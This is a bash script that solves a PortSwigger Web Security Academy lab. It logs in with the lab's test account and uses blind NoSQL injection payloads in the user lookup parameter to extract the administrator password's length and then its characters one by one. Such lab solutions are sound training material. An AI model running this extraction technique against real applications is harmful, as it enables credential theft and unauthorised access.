#!/bin/bash

# Author: kond3
# Date: 30/08/2024
# Last modified: 30/08/2024 11:23:34

# Description
# Script to solve the "Exploiting NoSQL injection to extract data" PortSwigger Lab

# Usage
# ./extract_data.sh <random_part_of_URL>


echo ""

if ! [ -d header ];then
	mkdir header
fi

csrf=$(curl -s -k -D header/header.txt "https://$1.web-security-academy.net/login" | grep 'name="csrf"' | awk '{print $5}' | sed 's/value="//' | sed 's/">//')
session=$(cat header/header.txt | grep 'session=' | awk '{print $2}' | sed 's/;//')
# echo "$csrf"
# echo "$session"

echo "Loggin in as wiener..."

curl -s -k -d "csrf=$csrf&username=wiener&password=peter" -b "$session" -D header/header.txt "https://$1.web-security-academy.net/login" &>/dev/null
session=$(cat header/header.txt | grep 'session=' | awk '{print $2}' | sed 's/;//')
curl -s -b "$session" -k "https://$1.web-security-academy.net/user/lookup?user=wiener" &>/dev/null

echo "Extracting password length..."

len=0

for i in {1..25};do
	# Payload user=administrator' && this.password.length == $i || 'a'=='b" URL encoded
	printf 'Payload: %s \r' "$i"
	curl -s -b "$session" -k "https://$1.web-security-academy.net/user/lookup?user=administrator'+%26%26+this.password.length+==+$i+||+'a'%3d%3d'b" | grep '"administrator"' &>/dev/null
	if [ $? = 0 ];then
		echo -e "\n\nLenght found!"
		len=$i
		break
	fi
done

echo -e "Lenght: $len \n"

echo "Extracting password..."

pwd=""

for (( i=0; $i < $len; i++ ));do
	for j in {a..z};do
		payload="$j"
		printf 'Payload: %s \t Password: %s \r' "$payload" "$pwd"
		curl -s -b "$session" -k "https://$1.web-security-academy.net/user/lookup?user=administrator'+%26%26+this.password\[$i\]+%3d%3d+'$j'+||+'a'%3d%3d'b" | grep '"administrator"' &>/dev/null
        if [ $? = 0 ];then
            pwd+="$payload"
            printf 'Payload: %s \t Password: %s \r' "$payload" "$pwd"
            break
        fi
	done
done

echo -e "\n\nPassword found!"
echo -e "Password: $pwd"

echo -e "\n\nGood luck with your PortSwigger Academy journey. \n\nPlease consider starring this repo, bye! \nkond3, $(date +%d.%m.%Y)"

echo ""
exit 0
